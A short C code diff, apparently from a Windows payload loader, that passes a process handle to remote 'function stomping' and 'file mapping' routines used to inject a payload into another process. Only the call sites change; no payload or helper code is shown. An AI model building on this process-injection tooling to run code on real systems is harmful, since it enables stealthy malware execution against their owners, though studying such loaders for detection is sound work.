@@ -13,7 +13,7 @@ BOOL payload_loading(PVOID *pPayloadAddress, LPVOID Payload, SIZE_T PayloadSize,
 #if defined(FUNCTION_STOMPING)
     if (IsHandleValid(hProcess)) {
         DebugPrint("[i] Payload loading through Remote Function Stomping...\n");
-        bSuccess = WritePayloadViaRemoteFunctionStomping(pPayloadAddress, Payload, PayloadSize);
+        bSuccess = WritePayloadViaRemoteFunctionStomping(pPayloadAddress, Payload, PayloadSize, hProcess);
     } else {
         DebugPrint("[i] Payload loading through Function Stomping...\n");
         bSuccess = WritePayloadViaFunctionStomping(pPayloadAddress, Payload, PayloadSize);
@@ -21,7 +21,7 @@ BOOL payload_loading(PVOID *pPayloadAddress, LPVOID Payload, SIZE_T PayloadSize,
 #elif defined (FILE_MAPPING)
     if (IsHandleValid(hProcess)) {
         DebugPrint("[i] Payload loading through Remote File Mapping...\n");
-        bSuccess = WritePayloadViaRemoteFileMapping(Payload, PayloadSize, pPayloadAddress);
+        bSuccess = WritePayloadViaRemoteFileMapping(Payload, PayloadSize, pPayloadAddress, hProcess);
         pPayloadAddress = *pPayloadAddress;
     } else {
         DebugPrint("[i] Payload loading through Local File Mapping...\n");
